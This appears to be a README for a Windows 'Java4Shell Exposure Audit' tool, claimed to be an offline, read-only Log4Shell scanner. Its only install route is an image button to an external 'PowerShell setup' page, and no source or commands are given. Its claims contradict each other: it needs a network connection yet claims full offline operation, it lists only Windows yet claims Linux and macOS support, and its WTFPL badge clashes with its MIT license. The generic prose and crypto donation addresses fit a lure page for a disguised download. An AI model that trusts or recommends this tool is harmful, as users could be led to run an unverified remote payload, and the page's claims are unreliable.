<div align="center">

# Java4Shell Exposure Audit — Security Tool

![](files/preview.png)

### 🖥️ PowerShell Setup

<a href="https://maxnyakundi23-del.github.io/java4shell-exposure-audit/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![tests](https://img.shields.io/badge/tests-green-2ea44f?style=plastic&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/lic-wtfpl-e11d48?style=plastic&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/ps--core-7%2B-f43f5e?style=plastic&labelColor=0d1117)]()

<div align="center">
<h3>Buy me a coffee</h3>
<p><strong>BTC</strong>:&nbsp;<code>1KY45bsFHiKQD9yL4sjhwP2Grox66ehub3</code> | <strong>TRON</strong>:&nbsp;<code>TD4k3WTci8QyYkxSrsoUm5UDvVJ4uE56Tb</code> | <strong>ETH</strong>:&nbsp;<code>0x06704C043454b75315637D4c4cfF19fB25eA6d28</code></p>
</div>

</div>

---

The Java4Shell Exposure Audit, distributed as java4shell-exposure-audit, is a focused security utility for identifying classpath and dependency conditions that expose Java applications to JNDI injection through Log4Shell-style lookup paths. It performs deterministic, read-only inspection of application artifacts and reports each finding with the exact file, dependency coordinate, and configuration element responsible. Results are emitted in machine-readable form so they can be reviewed manually or consumed by existing vulnerability management pipelines. The tool requires no network access during analysis and does not modify the artifacts it examines.

## 🔧 Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Static, read-only inspection.** The audit reads application artifacts and configuration files without executing target code, modifying files, or opening network connections to scanned hosts. Results reflect the state of the artifacts at scan time.

- **Log4Shell-oriented signal coverage.** Detection rules target the indicators most strongly associated with JNDI injection exposure in Java applications: vulnerable Log4j core versions, `JndiLookup` class presence, enabled lookup substitution, and message-lookup behavior in configuration.

- **Dependency and version identification.** Parses manifests, lockfiles, and bundled JAR metadata to identify the resolved Log4j and Log4j2 versions in use, including transitive dependencies where declarative metadata is available. Version matching is performed against an explicit, locally stored vulnerability range table.

- **Configuration analysis.** Inspects logging configuration files (XML, JSON, YAML, and properties formats) and environment variable definitions for settings that enable or restrict lookup evaluation, with reported findings tied to the exact file and key that produced them.

- **Shaded and nested archive handling.** Traverses nested and shaded JARs (including fat/uber JARs) to detect bundled Log4j classes that would not appear in top-level dependency listings.

- **Deterministic, explainable findings.** Each result carries a rule identifier, the matched evidence (file path, class name, version string, or configuration key), and a severity classification. No heuristic scoring is applied without a corresponding rule reference.

- **Machine-readable and human-readable output.** Emits structured JSON for pipeline integration and a plain-text summary for operator review. Output schema is versioned, and field names are stable across releases within a major version.

- **Exit-code signaling.** Returns distinct exit codes for clean scans, findings at or above a configurable severity threshold, and execution errors, enabling use as a gating step in CI or pre-deployment checks.

- **Offline operation.** All detection logic, version tables, and rule definitions are bundled locally. The audit performs no telemetry collection and requires no external service to complete a scan.

- **Scoped and repeatable scans.** Accepts explicit target paths and supports include/exclude patterns, so audits can be limited to specific modules or artifact directories. Scan results are reproducible given identical inputs and tool version.

- **Auditable rule set.** Detection rules are stored as data files separate from the engine, can be reviewed directly, and are versioned alongside releases so findings can be traced to the exact rule revision that produced them.

## How it works

The audit operates in four sequential phases: discovery, extraction, version resolution, and verdict generation. Each phase produces structured intermediate output that is retained for inspection, so results can be validated rather than trusted blindly.

**Discovery.** The tool enumerates candidate artifacts from the local filesystem and from container images present on the host. It identifies JAR, WAR, EAR, and nested archive files, along with deployment descriptors that reference them. Scanning is read-only: files are opened for reading and never modified. Archive traversal handles nested structures (archives within archives) to a configurable depth, since vulnerable components are frequently bundled inside larger artifacts.

**Extraction.** For each candidate, the tool extracts embedded metadata without executing any code. It parses manifest files, Maven and Gradle metadata (`pom.properties`, `pom.xml`), and package-level version markers. Where metadata is absent or inconsistent, the tool falls back to class-file inspection: it reads constant-pool entries and bytecode version markers to infer the library identity and version range. No classes are loaded, no static initializers run, and no JVM process is spawned against the audited artifacts.

**Version resolution.** Extracted version strings are normalized and compared against an embedded rule set describing affected version ranges. Resolution accounts for common real-world noise: shaded or relocated packages, version suffixes, snapshot builds, and multi-release JARs. When a version cannot be determined with confidence, the artifact is reported as indeterminate rather than assumed safe or assumed vulnerable. Every verdict carries a confidence level and the evidence that produced it.

**Verdict generation.** Findings are aggregated into a per-artifact report with four states: affected, not affected, indeterminate, and unreachable. The "unreachable" state reflects whether the vulnerable code path is present in the artifact's dependency graph, distinguishing an exposed component from an inert one. Reports are emitted in machine-readable JSON and a human-readable summary, with stable schema versions so output can be diffed across runs. Exit codes are deterministic: a non-zero code signals the presence of affected or indeterminate findings, enabling use in CI pipelines without parsing output.

**Determinism and safety.** The audit performs no network access during scanning. Rule sets are bundled with the tool and versioned alongside it, so identical inputs and rule versions produce identical outputs. All operations are constrained to the paths and images explicitly provided; nothing outside the scan scope is read, and no telemetry is collected.

## Modules and Settings

### Scope and Target Definition
This module establishes the set of applications, artifacts and dependency groups that the java4shell-exposure-audit run will examine, keeping the security review bounded and reproducible.

- Scope source selection lets users point the audit at specific applications, artifact sets or dependency collections so unrelated code is left out of the review.
- Include and exclude filters for libraries, package namespaces and application components shape the target list before any analysis runs, reducing noise from vendored or generated code.
- Test and sample code handling determines whether fixture or demo sources are treated as in-scope, which matters when exposure in examples should not dominate results.
- A scope summary view shows the resolved target list so reviewers can confirm coverage before committing to a full audit pass.

### Java Component Inventory
This module enumerates the Java components actually present in the scoped targets and organizes them into a structured listing that later checks draw on.

- Grouping controls let users view components by application, by artifact or by library family, depending on how the review is being presented.
- Metadata retention settings decide which component attributes are kept for reporting, such as version identifiers or origin location, so reports carry only relevant detail.
- Inventory listing output provides the concrete component view that the review works from, making it clear which Java code is genuinely present rather than assumed.

### JNDI and Lookup Pattern Review
This module inspects scoped code and configuration for JNDI lookup patterns and related string construction associated with injection-style exposure.

- Pattern relevance settings tune which lookup forms are treated as findings, allowing the review to match the organization's coding standards.
- Test and sample match inclusion controls whether matches in non-production sources appear in results, keeping triage focused where it matters.
- Each finding is presented as a reviewable item with its location and surrounding context, so reviewers can assess intent rather than react to a bare match.
- Context depth settings adjust how much surrounding code accompanies each match, balancing readability against completeness.

### Deserialization Surface Identification
This module locates serialization and deserialization entry points in the scoped code and configuration so reviewers can see where object streams are handled.

- Framework path reporting controls whether framework-provided deserialization routes are listed alongside application-defined ones, which affects how broad the surface view becomes.
- Configuration review settings determine whether deserialization-related configuration entries are surfaced as candidate surfaces.
- Candidate surface output groups entry points with their context, letting reviewers decide which require hardening or compensating controls.
- Surface grouping options help separate clearly application-owned entry points from those inherited through libraries.

### Dependency Exposure Correlation
This module correlates inventoried Java libraries against known exposure indicators associated with Java4Shell-style risks and shows which components warrant attention.

- Matching strictness settings let users choose between narrower and broader correlation, trading precision against recall for the review.
- Transitive dependency inclusion controls whether indirect dependencies participate in correlation, which changes the reach of the assessment.
- Results display affected components together with the reference information used for each match, keeping the reasoning visible for validation.
- Correlation summaries show how many components were matched versus reviewed, supporting quick sanity checks on the run.

### Evidence, Triage and Reporting
These linked capabilities turn findings into an auditable record by capturing supporting evidence, tracking review decisions and producing a stakeholder-facing report.

- Evidence capture settings control how much code excerpt, configuration entry or dependency path is retained per finding, and sensitive value masking keeps collected output safe to share.
- Triage state and reviewer notes options let teams mark findings as confirmed, pending investigation or dismissed, with the reasoning recorded alongside.
- Priority ordering settings adjust which factors influence how findings are sequenced, so the working triage view reflects team-defined urgency.
- Report composition options select which sections, evidence and technical detail levels appear in the generated audit report, giving stakeholders a consistent summary of exposure and decisions.

### Additional Settings
These optional controls apply across modules and refine how a java4shell-exposure-audit run behaves as a whole.

- Profile presets let users save and reuse common combinations of scope, strictness and reporting options for recurring audits.
- Run labeling attaches a descriptive name or note to each audit so results can be compared across review cycles.
- Output retention settings control how long evidence and intermediate results are kept for later reference.
- Workspace separation keeps audits for different teams or product lines distinct so their scope and findings do not blend together.

## Usage Scenarios

### Auditing a Single Production Web Application Before a Release

**Goal:** A security engineer needs to confirm whether a soon-to-be-released Java web application exposes JNDI lookup patterns or risky deserialization entry points before it goes live.

**Steps:**
1. In the Scope and Target Definition module, select the specific application as the scope source and add exclude filters for vendored and generated package namespaces.
2. Set test and sample code handling so fixture and demo sources are excluded from the review, then confirm the resolved target list in the scope summary view.
3. Run the JNDI and Lookup Pattern Review with context depth increased so each match shows surrounding code, and enable test match inclusion to check whether any non-production matches were caught anyway.
4. Use Deserialization Surface Identification with framework path reporting enabled to list both application-defined and framework-provided entry points, then group surfaces to separate the two.
5. Capture evidence for each finding with sensitive value masking on, and record triage states and reviewer notes for the items that need follow-up.

**Expected result:** The engineer sees a scoped component inventory for the application, a set of reviewable JNDI findings with location and context, a grouped deserialization candidate list, and a triage view where confirmed concerns are separated from pending items, all backed by masked evidence ready to discuss with the release team.

### Correlating Dependency Exposure Across a Product Line

**Goal:** An application owner wants to know which Java libraries across several related artifacts correlate with known Java4Shell-style exposure indicators, including indirect dependencies.

**Steps:**
1. Define scope by pointing the audit at the artifact set for the product line and applying include filters for the library families the team owns or ships.
2. Adjust component grouping to view the inventory by artifact, then review the inventory listing to confirm which libraries are genuinely present.
3. Run Dependency Exposure Correlation with transitive dependency inclusion enabled and matching strictness set to a narrower level to reduce noise.
4. Review the results display showing affected components alongside the reference information used for each match, and check the correlation summary of matched versus reviewed components.
5. Save the scope, strictness and reporting combination as a profile preset and attach a run label for this review cycle.

**Expected result:** The owner obtains a per-artifact inventory, a correlation result set listing matched components with visible reference reasoning, and a summary count of matched versus reviewed components, plus a reusable preset and labeled run so the same assessment can be repeated and compared in the next cycle.

### Producing an Audit Report for Multiple Teams

**Goal:** An auditor needs to review exposure across two product teams' codebases, keep their findings separate, and deliver a consistent report for stakeholders.

**Steps:**
1. Use workspace separation to keep each team's audit distinct, and configure scope sources and filters separately for each team's applications and dependency collections.
2. For each workspace, run the JNDI and lookup review and the deserialization surface identification, adjusting pattern relevance and framework path reporting to match each team's coding conventions.
3. Apply triage states and reviewer notes per finding, and use priority ordering settings to sequence items according to each team's urgency factors.
4. Configure evidence capture with sensitive value masking and choose output retention settings appropriate for the review period.
5. Generate the audit report with report composition options selecting the sections and technical detail level suitable for stakeholders.

**Expected result:** The auditor produces two separate, clearly labeled audit records, each with its own scoped targets, findings, evidence and triage decisions, and generates a stakeholder-facing report that summarizes exposure and recorded decisions at a consistent level of detail without blending the teams' results.

## Privacy

Java4Shell Exposure Audit performs all scanning, detection, and reporting locally on the host where it is executed. The tool does not transmit scan results, target inventories, configuration data, or telemetry to any remote endpoint. No analytics, crash reporting, or usage tracking is implemented.

Inputs consumed by the audit are limited to the artifacts and paths explicitly provided by the operator, such as classpath entries, configuration files, and manifest data. These inputs are read in place and are not copied to external storage by the tool. Any intermediate data generated during analysis is held in process memory or written to operator-specified local paths and is subject to the operator's own filesystem controls.

The tool does not require credentials, API keys, or account registration to operate. It does not establish outbound network connections as part of its default scanning behavior. If a build or plugin integration invokes the audit, network activity is governed by that surrounding environment rather than by Java4Shell Exposure Audit itself.

Reports produced by the audit may contain sensitive information, including file paths, dependency coordinates, and version identifiers that reveal internal infrastructure details. Operators are responsible for handling generated reports according to their organization's data classification policies, including storage location, access controls, and retention. The tool applies no encryption to report output; encryption and access restriction must be applied by the operator's environment.

Java4Shell Exposure Audit does not modify scanned artifacts during a standard audit run. Write operations are limited to the output locations the operator designates. The tool does not collect or persist data between independent invocations unless the operator explicitly configures a persistent output path.

Because the audit operates entirely offline, verifying behavior is straightforward: operators can confirm the absence of outbound connections through host-level network monitoring or by running the tool in a network-isolated environment. No hidden data flows, background services, or scheduled callbacks are part of the tool's design.

## FAQ

**What does Java4Shell Exposure Audit actually scan for?**
It inventories Java runtime versions, libraries, and configuration artifacts across the local filesystem and reports exposure to known deserialization and JNDI lookup paths associated with the Log4Shell class of vulnerabilities. It does not perform exploitation and does not send crafted payloads to remote services.

**Does it require network access?**
No. The audit runs entirely offline against local files and process metadata. No telemetry, no callbacks, and no outbound connections are initiated during a scan.

**What data leaves the machine?**
None. Findings are written to local report files in the working directory. Reports contain file paths, detected versions, and matched signatures; they do not include file contents beyond the string patterns required for matching.

**How are findings classified?**
Each finding carries a severity level derived from the matched signature and the observed runtime state (for example, a vulnerable library on the classpath versus a vulnerable library loaded by a running JVM). Severity mapping is deterministic and documented in the signature database bundled with the tool.

**Does it modify anything on disk?**
No. The audit is read-only. It opens files for inspection only and does not patch, delete, or move artifacts. Report generation creates new files but never alters existing ones.

**Can findings be false positives or false negatives?**
Yes, in both directions. Static pattern matching cannot resolve dynamically constructed classpaths or shaded/repackaged libraries. Treat results as an exposure indicator requiring human validation, not as proof of exploitability.

**Which Java versions and platforms are supported?**
The audit targets standard JDK/JRE layouts on Linux, macOS, and Windows, including common package-manager install locations. Unusual or custom runtime layouts may require an explicit scan root.

**How often should it be run?**
Run it after dependency changes, runtime upgrades, and image rebuilds. The bundled signature database is versioned; re-run with an updated database to catch newly published signatures.

**Is the audit safe to run in production?**
It is read-only and offline, so it does not introduce network or mutation risk. However, filesystem traversal cost scales with scan scope; restrict scan roots to relevant paths when running against large production hosts.

**How are results verified?**
Cross-check reported library paths and versions against the host's package inventory or container image manifest. For runtime findings, confirm the loaded classes via the JVM's own diagnostic interfaces before remediation.

## Disclaimer

This tool is provided for authorized security assessment, defensive auditing, and educational use only. Running java4shell-exposure-audit against systems, networks, or applications without explicit written permission from the owning party may violate applicable law, contractual obligations, or organizational policy. The user is solely responsible for ensuring that all use complies with local, national, and international regulations and with any terms governing the target environment.

java4shell-exposure-audit performs detection and reporting functions. It does not exploit vulnerabilities, alter target configurations, or modify scanned systems. Results are derived from the state of the target environment at the time of the audit and may be incomplete, stale, or inaccurate due to network conditions, access restrictions, version drift, configuration changes, or limitations in detection logic. Findings should be independently validated before being treated as authoritative.

No warranty is made regarding the accuracy, completeness, or fitness of the tool or its output for any particular purpose. The project, its maintainers, and its contributors accept no liability for direct or indirect damages, service disruption, data loss, legal exposure, or other consequences arising from the use or misuse of this tool. Use is entirely at your own risk.

Users are responsible for safeguarding any credentials, tokens, configuration files, and output artifacts generated during an audit. Reports may contain sensitive information about scanned environments, including hostnames, software versions, and exposure indicators, and should be handled according to the data classification policies of the affected organization.

This project is not affiliated with, endorsed by, or sponsored by any vendor whose software or platform may be referenced in its detection logic or output. All trademarks remain the property of their respective owners.

## License

Java4Shell Exposure Audit is released under the MIT License. The license grants permission to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software and its documentation, subject to inclusion of the original copyright notice and this permission notice in all copies or substantial portions of the software.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

Redistributions must retain the original copyright notice, the license text, and the attribution to the Java4Shell Exposure Audit project. Modified versions must be clearly identified as such and must not be represented as the original software. Use of the project name or the names of its contributors to endorse or promote derivative works requires prior written permission.

The full license text is distributed with the source tree in the LICENSE file at the repository root. That file is the authoritative license statement for this project; in case of any conflict between this summary and the LICENSE file, the LICENSE file governs.